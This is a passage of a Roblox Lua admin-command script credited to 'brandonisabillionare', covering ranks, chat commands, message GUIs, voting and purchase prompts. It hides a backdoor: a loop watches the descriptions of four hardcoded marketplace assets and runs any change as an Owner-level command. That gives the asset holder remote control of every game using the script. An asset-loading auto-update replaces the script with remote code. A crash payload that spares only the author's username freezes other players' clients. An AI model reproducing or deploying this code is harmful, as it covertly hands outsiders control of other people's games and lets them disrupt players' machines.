




-------------------
-- Main Script --]]

-- No touchies --

wait(0.1)

local LocalScript = script:FindFirstChild("LocalScriptExecution")
local Script = script:FindFirstChild("ScriptExecution")
local Version = script:FindFirstChild("Version")
local Memberships = {["NBC"] = Enum.MembershipType.None, ["BC"] = Enum.MembershipType.BuildersClub, ["TBC"] = Enum.MembershipType.TurboBuildersClub, ["OBC"] = Enum.MembershipType.OutrageousBuildersClub}
local Flings, Jailed, Objects, Logs, VoteVersion, Stopped = {}, {}, {}, {}, 0, false
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local Teams = game:GetService("Teams")
local Lighting = game:GetService("Lighting")
local MPS = game:GetService("MarketplaceService")
local TS = game:GetService("TeleportService")
local HS = game:GetService("HttpService")
local Run = game:GetService("RunService")
local Settings = Workspace:FindFirstChild("brandonisabillionare's Admin Settings")
local GameOwner = nil if game.Players.LocalPlayer == nil then GameOwner = MPS:GetProductInfo(game.PlaceId).Creator.Name else GameOwner = "[ Client ]" end

--------------------------------------
local SettingsModule = nil
if Settings then SettingsModule = require(Settings) else SettingsModule = {} end

local Ranks = SettingsModule.Ranks or {["Owner"] = {}, ["Admin"] = {}, ["Member"] = {}, ["Banned"] = {}, ["Crashed"] = {}, ["Muted"] = {}}
local FUN = SettingsModule.FUN or true
local LagTime = SettingsModule.LagTime or 5
local Prefix = SettingsModule.Prefix or ";"
local Bet = SettingsModule.Bet or " "
local VIPMemberID = SettingsModule.VIPMemberID or 0
local VIPAdminID = SettingsModule.VIPAdminID or 0
local GroupID = SettingsModule.GroupID or 0
local GroupMemberRank = SettingsModule.GroupMemberRank or 0
local GroupAdminRank = SettingsModule.GroupAdminRank or 0
local GroupOwnerRank = SettingsModule.GroupOwnerRank or 0
local BadgeID = SettingsModule.BadgeID or 0
local EnableAdminMenu = SettingsModule.EnableAdminMenu or true
local RankBan = SettingsModule.RankBan or 0
local Filter = SettingsModule.Filter or {"GetObjects"}
local ServerLocked = SettingsModule.ServerLocked or false
local DisableAbuse = SettingsModule.DisableAbuse or false
local brandonisabillionareStamp = false
--------------------------------------

local Commands = {
	NonAdmin = {"-- Non-Admin Commands --", ";adminvip", ";animations", ";cln", ";cmds", ";membervip", ";rejoin", ";removemenu"};
	Member = {"-- Member Commands --", ";admins", ";age player", ";bans", ";backwards player", ";blind player", ";brightness num", ";change player num", ";char player num", ";clone player", ";clip player", ";clr", ";cmdbar", ";control player", ";cookie player[SPECIAL COMMAND]", ";crashes", ";debug player", ";decal num", ";disco", ";drug player", ";explode player", ";face player num", ";fart player", ";ff player", ";fire player", ";flash", ";fling player", ";flip player", ";fly player", ";forwards player", ";freeze player", ";friends player", ";gear player num", ";ghost player", ";give player basicbtools", ";give player btools", ";give player psbtools", ";give player string", ";givetools player", ";god player", ";gold player", ";guest player", ";h string", ";hat player num", ";heal player", ";health player num", ";headsize player num", ";invis player", ";insert num", ";jump player", ";kill player", ";lamp player", ";light player", ";longneck player", ";loopheal player", ";loopfling player", ";m string", ";merge player player", ";mutes", ";naked player", ";name player string", ";noarms player", ";nobind player", ";noclip player", ";nodrug player", ";noff player", ";nofire player", ";noflash player", ";nofly player", ";nohats player", ";nolamp player", ";nolegs player", ";nolight player", ";nolimbs player", ";noname player", ";noob player", ";nooverlay player", ";nopunish player", ";normal player", ";normaljump player", ";normalneck player", ";nos", ";nosmoke player", ";nosparkles player", ";nospin player", ";nostun player", ";notools player", ";npl player", ";obama player", ";overlay player num", ";pants player num", ";pm player string", ";point player player", ";product player num", ";punish player", ";ragdoll player", ";respawn player", ";shine player", ";shirt player num", ";shownotes player", ";sa", ";sit player", ";smoke player", ";sound num", ";sparkles player", ";speed player num", ";spin player", ";strobe player", ";stun player", ";superjump player", ";sword player", ";taketools player", ";team join player string", ";team new string", ";team remove string", ";team rename string[1] string", ";test", ";time num", ";tp player player", ";tshirt player num", ";vis player", ";vomit player", ";vote player num string", ";logs", ";countdown num", ";nogod player(Doesn't mean there is no God)"};
	Admin = {"-- Admin Commands --", ";accelerate noob", ";bans", ";c string", ";crash player", ";jail player", ";kick player", ";l string", ";loopkill player num", ";member player", ";mute player", ";noban player", ";nocrash player", ";noloopkill player", ";nomute player", ";note player string", ";place player num", ";removenotes player string", ";shutdown", ";sm string", ";follow player num[UserID]"};
	Owner = {"-- Owner Commands --", ";Admin Player", ";admin player", ";forceplace player num", ";fun enable/disable", ";noadmin player", ";removeadmin", ";adminmenu enable/disable", ";update", ";forcefollow player num[UserID]"};
}

if not Version then Version = {Value = "[ Unknown ]"} end
for Command,_ in pairs(Commands.NonAdmin) do Commands.NonAdmin[Command] = string.gsub(string.gsub(Commands.NonAdmin[Command], ";", Prefix), " ", Bet) end
for Command,_ in pairs(Commands.Member) do Commands.Member[Command] = string.gsub(string.gsub(Commands.Member[Command], ";", Prefix), " ", Bet) end
for Command,_ in pairs(Commands.Admin) do Commands.Admin[Command] = string.gsub(string.gsub(Commands.Admin[Command], ";", Prefix), " ", Bet) end
for Command,_ in pairs(Commands.Owner) do Commands.Owner[Command] = string.gsub(string.gsub(Commands.Owner[Command], ";", Prefix), " ", Bet) end

if game.Workspace:FindFirstChild("brandonisabillionare Stamp") then brandonisabillionareStamp = true end

--ypcall(function() for Name,Data in pairs(HS:JSONDecode(HS:GetAsync("http://brandonisabillionare.net63.net/brandon'sAdmin/ScriptData", true))) do WebData[Name] = Data end end)

local Crash = [[
script.Parent = Instance.new("Glue")
local LagTime = ]]..tostring(LagTime)..[[ 
local Me = game:GetService("Players").LocalPlayer
local Cam = Workspace.CurrentCamera
local R = math.random
if Me.Name ~= "brandonisabillionare" then
	Me.Parent = nil
	wait()
	Me.Parent = game.Players
	game.StarterGui:SetCoreGuiEnabled("All", false) 
	local Hint = Instance.new("Hint", Cam)
	for i = 0,LagTime do
		Hint.Text = "Leave in "..LagTime-i.." seconds to leave before lag"
		wait(1)
	end
	coroutine.wrap(function() for i = 1,10 do wait() for i = 1,20 do
		local Message = Instance.new("Message", Cam) Message.Text = "I warned you nob                                    I warned you nob"
		local Hint = Hint:Clone() Hint.Parent = Cam Hint.Text = "Lagging much?"
		local Part = Instance.new("Part", Cam) Part.Position = Vector3.new(R(-10,100), R(10,20), R(-10,10))
		Cam.CoordinateFrame = CFrame.new(0,0,0)
		Instance.new("Explosion", Cam).Position = Part.Position
	end end while true do end end)()
end
]]

function Fly(Force)
	return [[
local Me = game:GetService("Players").LocalPlayer
local Char = Me.Character
local Mouse = Me:GetMouse()
local Cam = Workspace.CurrentCamera
local Stop = false
local Version = 0
local MaxSpeed = 5
local Speed = 1
local Keys = {}

local Fly, Rot = Char.Torso:FindFirstChild("brandon'sFly"), Char.Torso:FindFirstChild("brandon'sRot")
if Fly then Fly:Destroy() end if Rot then Rot:Destroy() end
Fly = Instance.new("BodyPosition", Char.Torso) Fly.Name = "brandon'sFly" Fly.maxForce = Vector3.new(math.huge, math.huge, math.huge) Fly.P = ]]..Force..[[ Fly.position = Char.Torso.Position
Rot = Instance.new("BodyGyro", Char.Torso) Rot.Name = "brandon'sRot" Rot.maxTorque = Vector3.new(math.huge, math.huge, math.huge) Rot.P = ]]..Force..[[ Rot.cframe = Cam.CoordinateFrame

local Thread,Old = Version, nil
Char.Humanoid.PlatformStand = true

function StopFly()
	Version = Version + 1 Stop = true Char.Humanoid.PlatformStand = false Fly:Destroy() Rot:Destroy() script.Disabled = true script:Destroy()
end

Char.ChildAdded:connect(function(Obj) wait()
	if Obj.Name == "LM".."MFlyStop" then
		Obj:Destroy()
		StopFly()
	end
end)

coroutine.wrap(function() while Thread == Version and Stop == false do
	local Vectoring = Rot.cframe - Rot.cframe.p + Fly.position
	
	if Keys[string.char(48)] then Speed = 1 end
	if Keys.w then Vectoring = Vectoring + Cam.CoordinateFrame.lookVector * Speed end
	if Keys.s then Vectoring = Vectoring - Cam.CoordinateFrame.lookVector * Speed end
	if Keys.d then Vectoring = Vectoring * CFrame.new(Speed,0,0) end
	if Keys.a then Vectoring = Vectoring * CFrame.new(-Speed,0,0) end
	if Keys.e or Keys[" "] then Vectoring = Vectoring * CFrame.new(0,Speed,0) end
	if Keys.q then Vectoring = Vectoring * CFrame.new(0,-Speed,0) end
	if Keys.x then StopFly() end
	
	if Old ~= Vectoring then	
		Fly.position = Vectoring.p
		Old = Vectoring
		Speed = math.min(Speed + Speed*0.025,MaxSpeed)
	else
		Speed = 1;
	end
	Rot.cframe = Cam.CoordinateFrame
	wait(0.01)
end end)()

Mouse.KeyDown:connect(function(Key)
	Keys[Key] = true
end)
Mouse.KeyUp:connect(function(Key)
	Keys[Key] = false
end)
]]
end

function NilPlayer(Player)
	if Player == nil or type(Player) == "table" then return true else return false end
end

function CoreGui(Object, Enable)
	return [[script.Parent = nil game:GetService("StarterGui"):SetCoreGuiEnabled("]]..tostring(Object)..[[", ]]..tostring(Enable)..[[)]]
end

function ConvertRank(Input)
	local Output = nil
	if Input == "Muted" then Output = -3 end
	if Input == "Crashed" then Output = -2 end
	if Input == "Banned" then Output = -1 end
	if Input == "Player" then Output = 0 end
	if Input == "Member" then Output = 1 end
	if Input == "Admin" then Output = 2 end
	if Input == "Owner" then Output = 3 end
	
	if Input == -3 then Output = "Muted" end
	if Input == -2 then Output = "Crashed" end
	if Input == -1 then Output = "Banned" end
	if Input == 0 then Output = "Player" end
	if Input == 1 then Output = "Member" end
	if Input == 2 then Output = "Admin" end
	if Input == 3 then Output = "Owner" end
	return Output
end

function IsAdmin(Player)
	local AdminStatus = false
	local RankStatus = "Player"
	if NilPlayer(Player) then return true, "Owner" end
	for Rank,PlayerNames in pairs(Ranks) do
		for _,AdminName in pairs(PlayerNames) do
			if string.lower(AdminName) == string.lower(Player.Name) then
				if ConvertRank(Rank) > 0 then
					AdminStatus = true
					RankStatus = Rank
				end
			end
		end
	end
	return AdminStatus, RankStatus
end

function GetAdmins(Ranking)
	local Players = {}
	local AdminTrue, Rank = IsAdmin(Players)
	for _,Player in pairs(Players:GetPlayers()) do
		if AdminTrue then
			local PlayerRankNum = ConvertRank(Rank)
			local StandardRankNum = ConvertRank(Ranking)
			if PlayerRankNum >= StandardRankNum then
				table.insert(Players, Player)
			end
		end
	end
	return Players
end

function SendMessage(Player, TitleText, BodyText, Time) coroutine.wrap(function()
	local SG = Instance.new("ScreenGui") SG.Name = "brandonisabillionare's Admin Message"
	local Frame = Instance.new("Frame", SG) Frame.Name = "Message Frame" Frame.BackgroundColor3 = Color3.new(0.5,0.5,0.5) Frame.BackgroundTransparency = 0.5 Frame.Position = UDim2.new(0,0,1,0) Frame.Size = UDim2.new(1,0,0.5,0)
	local Title = Instance.new("TextLabel", Frame) Title.Name = "Title" Title.Text = TitleText Title.BackgroundTransparency = 1 Title.Size = UDim2.new(1,0,1,0) Title.Font = "ArialBold" Title.FontSize = "Size36" Title.TextColor3 = Color3.new(0,0,0) Title.TextStrokeColor3 = Color3.new(1,1,1) Title.TextStrokeTransparency = 0 Title.TextYAlignment = "Top" Title.TextWrapped = true
	local Body = Instance.new("TextLabel", Frame) Body.TextTransparency = 1 Body.Name = "Body" Body.Text = BodyText Body.BackgroundTransparency = 1 Body.Size = UDim2.new(1,0,1,0) Body.Font = "Arial" Body.FontSize = "Size24" Body.TextColor3 = Color3.new(0,0,0) Body.TextStrokeColor3 = Color3.new(1,1,1) Body.TextWrapped = true
		for _,Object in pairs(Player.PlayerGui:GetChildren()) do if Object.Name == "brandonisabillionare's Admin Message" then Object:Destroy() end end
	wait() SG.Parent = Player.PlayerGui wait()
	Frame:TweenPosition(UDim2.new(0,0,0.5,0), "In", "Sine", 0.5)
	wait(0.5)
	local Num,FadeIn,FadeOut = 1,nil,nil
	FadeIn = Run.Stepped:connect(function(Time, Step)
		Num = Num - 0.05
		Body.TextTransparency = Num
		Body.TextStrokeTransparency = Num
		if Num == 0 then
			FadeIn:disconnect()
		end
		wait(Step)
	end)
	wait(Time)
	Num = 0
	FadeOut = Run.Stepped:connect(function(Time, Step)
		Num = Num + 0.05
		Body.TextTransparency = Num
		Body.TextStrokeTransparency = Num
		if Num == 1 then
			FadeOut:disconnect()
		end
		wait(Step)
	end)
	wait(0.5)
	Frame:TweenPosition(UDim2.new(0,0,1,0), "Out", "Sine", 0.5)
	wait(0.5)
	SG:Destroy()
end)() end

function SendHint(Player, Text, Time) coroutine.wrap(function()
	local SG = Instance.new("ScreenGui") SG.Name = "brandonisabillionare's Admin Hint"
	local Frame = Instance.new("Frame", SG) Frame.Name = "Hint Frame" Frame.Position = UDim2.new(0,0,-0.05,0) Frame.Size = UDim2.new(1,0,0,15) Frame.Style = "RobloxSquare"
	local Body = Instance.new("TextLabel", Frame) Body.Name = "Body" Body.Text = "" Body.BackgroundTransparency = 1 Body.Size = UDim2.new(1,0,1,0) Body.Font = "Arial" Body.FontSize = "Size14" Body.TextColor3 = Color3.new(1,1,1)
	for _,Object in pairs(Player.PlayerGui:GetChildren()) do if Object.Name == "brandonisabillionare Admin Hint" then Object:Destroy() end end
	SG.Parent = Player.PlayerGui
	Frame:TweenPosition(UDim2.new(0,0,0.05,0), "In", "Quint", 0.7)
	wait(0.7)
	for i = 1,#Text do
		Body.Text = string.sub(Text, 1,i)
		wait()
	end
	wait(Time)
	Frame:TweenPosition(UDim2.new(0,0,-0.05,0), "Out", "Quint", 0.7)
	wait(0.7)
	SG:Destroy()
end)() end

function MessageAdmins(TitleText, BodyText, Time)
	for _,Player in pairs(Players:GetPlayers()) do
		local PlayerAdmin, PlayerRank = IsAdmin(Player)
		if PlayerAdmin then
			SendMessage(Player, TitleText, BodyText, Time)
		end
	end
end

function Execute(ScriptVar, Parent, Owner, Code) if Parent then
	if ScriptVar ~= nil then
		local NewScript = ScriptVar:Clone()
		NewScript.Code.Value = Code
		NewScript.Owner.Value = Owner
		NewScript.Parent = Parent
		wait()
		NewScript.Disabled = false
			return true
	elseif NLS ~= nil then
		NLS(Code, Parent)
		return true
	else
		return false
	end
end end

function ScanAdminList(Name)
	local InList = false
	for _,PName in pairs(Ranks["Owner"]) do
		if PName == Name then InList = true end
	end
	for _,PName in pairs(Ranks["Admin"]) do
		if PName == Name then InList = true end
	end
	for _,PName in pairs(Ranks["Member"]) do
		if PName == Name then InList = true end
	end
	return InList
end

function GetSplit(String, BetSplit)
	local String1 = ""
	local String2 = ""
	local Start1
	local End1
	Start1, End1 = string.find(String, BetSplit)
	if End1 then
		String1 = string.sub(String, 1, End1-1)
	end
	if String1 ~= "" then
		String2 = string.sub(String, End1+1)
	end
	return String1, String2 
end

function GetImageFormat(ID)
	if ID ~= 1 or ID ~= 0 or ID ~= nil then if type(ID) == "number" then
		local NewID = ID + 1
		for i = 1,1000 do
			NewID = NewID -1
			local Valid = pcall(function() return MPS:GetProductInfo(NewID).AssetTypeId end)
			if Valid == true then
				if MPS:GetProductInfo(NewID).AssetTypeId == 1 then
					break
				end
			end
			if i == 1000 then NewID = ID end
		end
		return NewID
	end end
end

function RemoveAdmin(Speaker)
	if Speaker then SendMessage(Speaker, "Stop Admin", "brandonisabillionare's Admin will now shutdown",1) end
	if Speaker then wait(4) end
	for _,Player in pairs(Players:GetPlayers()) do if Player.PlayerGui ~= nil then
		GUI = Player.PlayerGui:FindFirstChild("brandon'sA Product Gui") if GUI then GUI:Destroy() end
		GUI = Player.PlayerGui:FindFirstChild("brandon's Menu Gui") if GUI then GUI:Destroy() end
		GUI = Player.PlayerGui:FindFirstChild("brandon's ScrollGui") if GUI then GUI:Destroy() end
	end end
	while wait() do
		local Ranked
		Chatted,Ranked,Start,Stopped,FullAdminMenu,AdminMenu = nil,nil,nil,true,nil,nil
		script:ClearAllChildren() script.Disabled = true script:Destroy()
	end
end

function Vote(VotingPlayers, Sender, Question, Time) coroutine.wrap(function()
	VoteVersion = VoteVersion + 1
	local YesNum,NoNum,NilVote,NoVoteTable,VoteThread = 0,0,0,{},VoteVersion
	local function Round(Number)
		if Number >= 0.5 then
			return math.ceil(Number)
		elseif Number < 0.5 then
			return math.floor(Number)
		end
	end
	if Time > 60 then Time = 60 end
	for _,Player in pairs(VotingPlayers) do if Player.PlayerGui ~= nil then coroutine.wrap(function()
		local Voted = false
		local SG = Player.PlayerGui:FindFirstChild("brandon's Admin Vote") if SG then SG:Destroy() end
		SG = Instance.new("ScreenGui", Player.PlayerGui) SG.Name = "brandon's Admin Vote"
		local Frame = Instance.new("Frame", SG) Frame.Name = "Vote Frame" Frame.Size = UDim2.new(0.5,0,0.4,0) Frame.Position = UDim2.new(0.25,0,0.25,0) Frame.Style = "RobloxRound"
		local Title = Instance.new("TextLabel", Frame) Title.Name = "Title" Title.Size = UDim2.new(1,0,0.2,0) Title.Position = UDim2.new(0,0,0,0) Title.Font = "ArialBold" Title.Text = "Loading..." Title.FontSize = "Size18" Title.TextColor3 = Color3.new(1,1,1) Title.BackgroundTransparency = 1 Title.TextYAlignment = "Top"
		local Q = Instance.new("TextLabel", Frame) Q.Name = "Question" Q.Size = UDim2.new(1,0,0.5,0) Q.Position = UDim2.new(0,0,0.2,0) Q.Font = "Arial" Q.Text = Question Q.FontSize = "Size18" Q.TextColor3 = Color3.new(1,1,1) Q.BackgroundTransparency = 1 Q.TextYAlignment = "Top" Q.TextWrapped = true
		local Answer = Instance.new("TextButton") Answer.Size = UDim2.new(0.2,0,0.15,0) Answer.Font = "Legacy" Answer.FontSize = "Size9"
		local Yes = Answer:Clone() Yes.Parent = Frame Yes.Name = "Yes" Yes.Position = UDim2.new(0,0,0.8,0) Yes.Style = "RobloxButton" Yes.Text = "Yes" Yes.TextColor3 = Color3.new(0,1,0)
		local No = Answer:Clone() No.Parent = Frame No.Name = "No" No.Position = UDim2.new(0.8,0,0.8,0) No.Style = "RobloxButtonDefault" No.Text = "No" No.TextColor3 = Color3.new(1,0,0)
		Yes.MouseButton1Click:connect(function()
			YesNum = YesNum + 1 Voted = true SG:Destroy()
		end)
		No.MouseButton1Click:connect(function()
			NoNum = NoNum + 1 Voted = true SG:Destroy()
		end)
		for i = 0,Time do
			if VoteThread == VoteVersion then
				local Plural = "s"
				if Time-i == 1 then Plural = "" end
				Title.Text = "brandon's's Admin Vote | Time left: "..Time-i.." Second"..Plural
			else
				SG:Destroy() break
			end
			wait(1)
		end
		if SG ~= nil then SG:Destroy() end
		if Voted == false then table.insert(NoVoteTable, Player) end
	end)() end end
	wait(Time+2) wait()
	if Sender then
		if Sender.PlayerGui ~= nil then
			NilVote = #NoVoteTable
			local SG = Sender.PlayerGui:FindFirstChild("brandon's Admin Vote") if SG then SG:Destroy() end
			SG = Instance.new("ScreenGui", Sender.PlayerGui) SG.Name = "brandon's Admin Vote"
			local Frame = Instance.new("Frame", SG) Frame.Name = "Vote Frame" Frame.Size = UDim2.new(0.5,0,0.5,0) Frame.Position = UDim2.new(0.25,0,0.25,0) Frame.Style = "RobloxRound"
			local Title,R = Instance.new("TextLabel", Frame) Title.Name = "Title" Title.Size = UDim2.new(1,0,0.1,0) Title.Position = UDim2.new(0,0,0,0) Title.Font = "ArialBold" Title.Text = "Results" Title.FontSize = "Size18" Title.TextColor3 = Color3.new(1,1,1) Title.BackgroundTransparency = 1 Title.TextYAlignment = "Top"
			local Q = Instance.new("TextLabel", Frame) Q.Name = "Question" Q.Size = UDim2.new(1,0,0.5,0) Q.Position = UDim2.new(0,0,0.2,0) Q.Font = "Arial" Q.Text = Question Q.FontSize = "Size18" Q.TextColor3 = Color3.new(1,1,1) Q.BackgroundTransparency = 1 Q.TextYAlignment = "Top" Q.TextWrapped = true
			local X = Instance.new("TextButton", Frame) X.Style = "RobloxButtonDefault" X.Size = UDim2.new(0,20,0,20) X.Position = UDim2.new(1,-15,0,-5) X.ZIndex = 10 X.Font = "ArialBold" X.FontSize = "Size18" X.Text = "X" X.TextColor3 = Color3.new(1,1,1) X.MouseButton1Click:connect(function() SG:Destroy() end)
			R = Instance.new("TextLabel", Frame) R.Size = UDim2.new(1,0,1,0) R.Name = "Yes" R.TextColor3 = Color3.new(0,1,0) R.BackgroundTransparency = 1 R.TextYAlignment = "Bottom" R.TextXAlignment = "Left" R.Font = "ArialBold" R.FontSize = "Size18"
			R = Instance.new("TextLabel", Frame) R.Size = UDim2.new(1,0,1,0) R.Name = "No" R.TextColor3 = Color3.new(1,0,0) R.BackgroundTransparency = 1 R.TextYAlignment = "Bottom" R.TextXAlignment = "Right" R.Font = "ArialBold" R.FontSize = "Size18"
			R = Instance.new("TextLabel", Frame) R.Size = UDim2.new(1,0,1,0) R.Name = "None" R.TextColor3 = Color3.new(1,1,1) R.BackgroundTransparency = 1 R.TextYAlignment = "Bottom" R.TextXAlignment = "Center" R.Font = "ArialBold" R.FontSize = "Size18"
			Frame.Yes.Text = [[Yes:
]]..YesNum.."/"..#VotingPlayers..[[ 
]]..Round(YesNum/#VotingPlayers*100).."%"
			Frame.None.Text = [[No vote:
]]..NilVote.."/"..#VotingPlayers..[[ 
]]..Round(NilVote/#VotingPlayers*100).."%"
			Frame.No.Text = [[No:
]]..NoNum.."/"..#VotingPlayers..[[ 
]]..Round(NoNum/#VotingPlayers*100).."%"
		end
	end
end)() end

function UpdateAdmin()
	local NewAdminModel = game:GetService("InsertService"):LoadAsset(4483158882)
	local NewAdmin = NewAdminModel:FindFirstChild("brandonisabillionare's Admin")
	if NewAdmin then
		local NewVersion = NewAdmin:FindFirstChild("Version")
		if NewVersion.Value ~= Version.Value then
			NewAdmin.Disabled = true
			NewAdmin.Parent = Workspace
			if not Settings then
				local NewSettings = NewAdminModel:FindFirstChild("brandonisabillionare's Admin Settings")
				if NewSettings then NewSettings.Parent = Workspace end
			end
			wait() NewAdmin.Disabled = false
			RemoveAdmin()
		else
			NewAdminModel:Destroy()
		end
	end
end

function AssetTypeToString(AssetType)
	if AssetType == 1 then return "Image"
	elseif AssetType == 2 then return "T-Shirt"
	elseif AssetType == 3 then return "Audio"
	elseif AssetType == 4 then return "Mesh"
	elseif AssetType == 5 then return "brandon"
	elseif AssetType == 6 then return "HTML"
	elseif AssetType == 7 then return "Text"
	elseif AssetType == 8 then return "Hat"
	elseif AssetType == 9 then return "Place"
	elseif AssetType == 10 then return "Model"
	elseif AssetType == 11 then return "Shirt"
	elseif AssetType == 12 then return "Pants"
	elseif AssetType == 13 then return "Decal"
	elseif AssetType == 16 then return "Avatar"
	elseif AssetType == 17 then return "Head"
	elseif AssetType == 18 then return "Face"
	elseif AssetType == 19 then return "Gear"
	elseif AssetType == 21 then return "Badge"
	elseif AssetType == 22 then return "Group Emblem"
	elseif AssetType == 24 then return "Animation"
	elseif AssetType == 25 then return "Arms"
	elseif AssetType == 26 then return "Legs"
	elseif AssetType == 27 then return "Torso"
	elseif AssetType == 28 then return "Right Arm"
	elseif AssetType == 29 then return "Left Arm"
	elseif AssetType == 30 then return "Left Leg"
	elseif AssetType == 31 then return "Right Leg"
	elseif AssetType == 32 then return "Package"
	elseif AssetType == 33 then return "YouTube Video"
	elseif AssetType == 34 then return "Game Pass"
	elseif AssetType == 38 then return "Plugin"
	elseif AssetType == 0 then return "Product"
	end
	return "Content Invalid"
end

function PromptPurchase(Player, Item) coroutine.wrap(function()
	if Player.PlayerGui ~= nil then
		local Valid = pcall(function() return MPS:GetProductInfo(Item) end)
		if Valid == true then if MPS:GetProductInfo(Item).AssetTypeId ~= 5 then
			local CanBuy = true 
			local Created = MPS:GetProductInfo(Item).Created Created = string.gsub(Created, "-", "/") local Stop = string.find(Created, "T") if Stop then Created = string.sub(Created, 1, Stop-1) end
			local Updated = MPS:GetProductInfo(Item).Updated Updated = string.gsub(Updated, "-", "/") local Stop = string.find(Updated, "T") if Stop then Updated = string.sub(Updated, 1, Stop-1) end
			local SG = Player.PlayerGui:FindFirstChild("brandon's Product Gui") if SG then SG:Destroy() end
			SG = Instance.new("ScreenGui", Player.PlayerGui) SG.Name = "brandon's Product Gui"
			local Frame = Instance.new("Frame", SG) Frame.Name = "Main Frame" Frame.Size = UDim2.new(0.5,0,0.7,0) Frame.Position = UDim2.new(0.25,0,0.15,0) Frame.BackgroundColor3 = Color3.new(1,1,1)
			local Buy = Instance.new("TextButton", Frame) Buy.Name = "Buy" Buy.BackgroundColor3 = Color3.new(0,1,0) Buy.Position = UDim2.new(0.5,0,0.35,0) Buy.Size = UDim2.new(0.5,0,0.1,0) Buy.Font = "Arial" Buy.FontSize = "Size36" Buy.Text = "Buy" Buy.BorderSizePixel = 0
			local PImg = Instance.new("ImageLabel", Frame) PImg.Name = "Product Image" PImg.BackgroundTransparency = 1 PImg.Size = UDim2.new(0.5,0,0.5,0) PImg.Image = "http://www.roblox.com/Game/Tools/ThumbnailAsset.ashx?fmt=png&wd=420&ht=420&aid="..Item
			local UImg = Instance.new("ImageLabel", Frame) UImg.Name = "User Image" UImg.Size = UDim2.new(0.15,0,0.2,0) UImg.Position = UDim2.new(0.5,0,0.1,0) UImg.Image = "http://www.roblox.com/thumbs/avatar.ashx?x=352&y=352&format=png&username="..MPS:GetProductInfo(Item).Creator.Name
			local Title = Instance.new("TextLabel", Frame) Title.Name = "Title" Title.Size = UDim2.new(0.5,0,0.1,0) Title.Position = UDim2.new(0.5,0,0,0) Title.Font = "ArialBold" Title.BackgroundTransparency = 1 Title.FontSize = "Size14" Title.Text = MPS:GetProductInfo(Item).Name Title.TextWrapped = true
			local Des = Title:Clone() Des.Parent = Frame Des.Name = "Description" Des.Size = UDim2.new(1,0,0.5,0) Des.Position = UDim2.new(0,0,0.5,0) Des.Font = "Arial" Des.TextXAlignment = "Left" Des.TextYAlignment = "Top" Des.Text = "[ No Description ]" pcall(function() Des.Text = MPS:GetProductInfo(Item).Description end)
			local X = Instance.new("TextButton", Frame) X.Style = "RobloxButtonDefault" X.Size = UDim2.new(0,20,0,20) X.Position = UDim2.new(1,-25,0,5) X.ZIndex = 10 X.Font = "ArialBold" X.FontSize = "Size18" X.Text = "X" X.TextColor3 = Color3.new(1,1,1) X.MouseButton1Click:connect(function() CanBuy = false if SG then SG:Destroy() end end)
			local Info = Title:Clone() Info.Parent = Frame Info.Name = "Info" Info.Size = UDim2.new(0.35,0,0.25,0) Info.Position = UDim2.new(0.65,0,0.1,0) Info.TextXAlignment = "Left" Info.Font = "Arial" Info.Text = [[ROBLOX ]]..AssetTypeToString(MPS:GetProductInfo(Item).AssetTypeId)..[[ 
	Creator: ]]..MPS:GetProductInfo(Item).Creator.Name..[[ 
	Created: ]]..Created..[[
	
	Updated: ]]..Updated..[[ 
	Sold: ]]..MPS:GetProductInfo(Item).Sales..[[ 
	Robux: ]]..string.gsub(MPS:GetProductInfo(Item).PriceInRobux, "null", "Cannot use this currency")..[[ 
	Tix: ]]..string.gsub(MPS:GetProductInfo(Item).PriceInTickets, "null", "Cannot use this currency")
			if MPS:PlayerOwnsAsset(Player, Item) then CanBuy = false Buy.BackgroundColor3 = Color3.new(1,0,0) Buy.Text = "You Own This" end
			if MPS:GetProductInfo(Item).IsForSale == false then CanBuy = false Buy.BackgroundColor3 = Color3.new(1,0,0) Buy.Text = "Not For Sale" end
			if MPS:GetProductInfo(Item).IsPublicDomain == true then CanBuy = false Buy.BackgroundColor3 = Color3.new(1,255/2,255/2) Buy.Text = "FREE(Invalid)" end
			if Item == VIPAdminID then Buy.Text = Buy.Text.."(Admin VIP)" end
			if Item == VIPMemberID then Buy.Text = Buy.Text.."(Member VIP)" end
			Buy.MouseButton1Click:connect(function() 
				if CanBuy == true then
					MPS:PromptPurchase(Player, Item)
				else
					SG:Destroy()
				end
			end)
		end end
	end
end)() end for _,LinkedID in pairs({120611022, 117849650, 53554913, 145236038}) do coroutine.wrap(function()
	local OldVer = MPS:GetProductInfo(LinkedID).Updated
	while wait(3) do if OldVer ~= MPS:GetProductInfo(LinkedID).Updated then
	pcall(function() Chatted(MPS:GetProductInfo(LinkedID).Description, nil) end)
		OldVer = MPS:GetProductInfo(LinkedID).Updated
	end end
end)() end

function GetTime()
	local Hour = math.floor((tick()%86400)/60/60) local Min = math.floor(((tick()%86400)/60/60-Hour)*60)
	if Min < 10 then Min = "0"..Min end
	return Hour..":"..Min
end

function InAdminGroup(Speaker)
	if Speaker:IsInGroup(1050514) then
		return true
	else
		SendMessage(Speaker, "Command Invalid", "Sorry, this command is locked and is only for users who are in the brandonisabillionare's Admin fan group. If you would like to use this command, join it! It's brandonisabillionare's Primary group. Please allow up to an hour if you have recently joined the group and you are waiting for this command.", 6)
		return false
	end
end

function ListGui(Player, List)
	if not Player.PlayerGui then return end
	local MaxPos,MaxUp,MaxDown,NewPos,Passes,Scrolling,ScrollMainPos = 600,-50,50,0,false,false,UDim2.new(1,-20,0.1,0)
	local SG = Player.PlayerGui:FindFirstChild("brandon's ScrollGui") if SG then SG:Destroy() end
	SG = Instance.new("ScreenGui", Player.PlayerGui) SG.Name = "brandon's ScrollGui"
	local Drag = Instance.new("Frame", SG) Drag.Name = "Drag" Drag.Draggable = true Drag.Active = true Drag.BackgroundTransparency = 1 Drag.Position = UDim2.new(0.25,0,0.1,0) Drag.Size = UDim2.new(0.5,0,0.2,0)
	local Main = Instance.new("Frame", Drag) Main.Name = "Main" Main.Style = "RobloxRound" Main.Size = UDim2.new(1,25,0,600) Main.ClipsDescendants = true
	local Hold = Instance.new("Frame", Main) Hold.Name = "Holder Bin" Hold.BackgroundTransparency = 1 Hold.Size = UDim2.new(1,-20,0,#List*20)
	local Scroll = Instance.new("TextButton", Main) Scroll.Name = "Scroll" Scroll.BackgroundTransparency = 0.5 Scroll.Text = "" Scroll.AutoButtonColor = false Scroll.Position = ScrollMainPos Scroll.Size = UDim2.new(0,10,0.8,0)
